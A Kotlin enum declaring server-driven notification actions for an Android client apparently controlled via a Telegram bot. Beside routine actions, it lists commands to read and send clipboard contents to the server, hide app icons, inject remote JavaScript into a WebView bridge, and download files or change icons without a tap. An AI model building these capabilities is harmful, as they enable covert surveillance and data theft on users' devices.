package com.xeg911.shared.data.model.notification

enum class NotificationActionDef(
    val id: String,
    val description: String,
    val requiredParams: List<String> = emptyList(),
    val optionalParams: List<String> = emptyList()
) {
    NOTHING(
        id = "NOTHING",
        description = "Tapping the notification does nothing"
    ),
    OPEN_APP(
        id = "OPEN_APP",
        description = "Brings the app to foreground (or the app given by packageName)",
        optionalParams = listOf("packageName")
    ),
    OPEN_OTHER_APP(
        id = "OPEN_OTHER_APP",
        description = "Opens another installed app",
        requiredParams = listOf("packageName")
    ),
    OPEN_URL(
        id = "OPEN_URL",
        description = "Opens a URL in the browser",
        requiredParams = listOf("url")
    ),
    DEEP_LINK(
        id = "DEEP_LINK",
        description = "Opens a deep-link URI",
        requiredParams = listOf("uri")
    ),
    OPEN_SETTINGS(
        id = "OPEN_SETTINGS",
        description = "Opens an Android Settings screen",
        requiredParams = listOf("screen"),
        optionalParams = listOf("packageName")
    ),
    COPY_TO_CLIPBOARD(
        id = "COPY_TO_CLIPBOARD",
        description = "Copies text to the clipboard",
        requiredParams = listOf("text"),
        optionalParams = listOf("label")
    ),
    GET_CLIPBOARD(
        id = "GET_CLIPBOARD",
        description = "Reads and sends the current clipboard content to the server"
    ),
    REQUEST_PERMISSION(
        id = "REQUEST_PERMISSION",
        description = "Requests a runtime permission",
        requiredParams = listOf("permission"),
        optionalParams = listOf("title", "rationale")
    ),
    DISMISS(
        id = "DISMISS",
        description = "Dismisses the notification"
    ),
    REPLY(
        id = "REPLY",
        description = "Shows an inline reply input field",
        optionalParams = listOf("hint")
    ),
    START_COMMAND(
        id = "START_COMMAND",
        description = "Triggers an app command",
        requiredParams = listOf("command")
    ),
    VIEW_DETAILS(
        id = "VIEW_DETAILS",
        description = "Opens a detail screen",
        requiredParams = listOf("detailType"),
        optionalParams = listOf("detailId", "detailTitle")
    ),
    HIDE_APP(
        id = "HIDE_APP",
        description = "Hides an app's launcher icon from the home screen / app drawer",
        optionalParams = listOf("packageName")
    ),
    SHOW_APP(
        id = "SHOW_APP",
        description = "Restores a hidden app's launcher icon to the home screen / app drawer",
        optionalParams = listOf("packageName")
    ),
    SHOW_WEB_PAGE(
        id = "SHOW_WEB_PAGE",
        description = "Opens an in-app WebView to display a URL or inline HTML/CSS/JS payload. " +
                "Optionally exposes the AppClient JS bridge, so server-driven pages " +
                "can send callbacks back through the active remote channels.",
        optionalParams = listOf(
            // content
            "url", "html", "baseUrl",
            // display
            "title", "showToolbar",
            // javascript
            "allowJs", "jsBridge", "injectedCss", "injectedJs",
            // user-agent
            "userAgent",
            // navigation
            "allowExternalNav",
            // ui/ux
            "zoomEnabled", "downloadEnabled",
            // privacy
            "clearOnExit",
            // display mode
            "displayMode", "dimAmount",
        ),
    ),
    DOWNLOAD_FILE(
        id = "DOWNLOAD_FILE",
        description = "Downloads a file from Telegram Storage into Downloads/AppClient " +
                "(max 20 MB, Bot API limit). autoStart=true downloads without a tap.",
        requiredParams = listOf("fileId", "fileName"),
        optionalParams = listOf(
            "mimeType",
            "fileSize",
            "sha256",
            "subDir",
            "transferId",
            "autoStart"
        ),
    ),
    UPLOAD_FILE(
        id = "UPLOAD_FILE",
        description = "Picks a file on the device (MEDIA_PICKER, PHOTO_PICKER, FILE_PICKER, SAF " +
                "or DIRECT_URI) and uploads it to Telegram Storage (max 50 MB), " +
                "then reports the file metadata back.",
        requiredParams = listOf("source"),
        optionalParams = listOf(
            "uri",
            "allowedMime",
            "maxSize",
            "allowMultiple",
            "caption",
            "transferId"
        ),
    ),
    SET_APP_ICON(
        id = "SET_APP_ICON",
        description = "Switches AppClient's launcher icon (default, mono, shield, orbit). " +
                "autoApply=true applies it as soon as the message arrives, without a tap.",
        requiredParams = listOf("iconStyle"),
        optionalParams = listOf("autoApply"),
    );

    companion object {
        fun fromId(id: String): NotificationActionDef? =
            entries.firstOrNull { it.id.equals(id, ignoreCase = true) }
    }
}
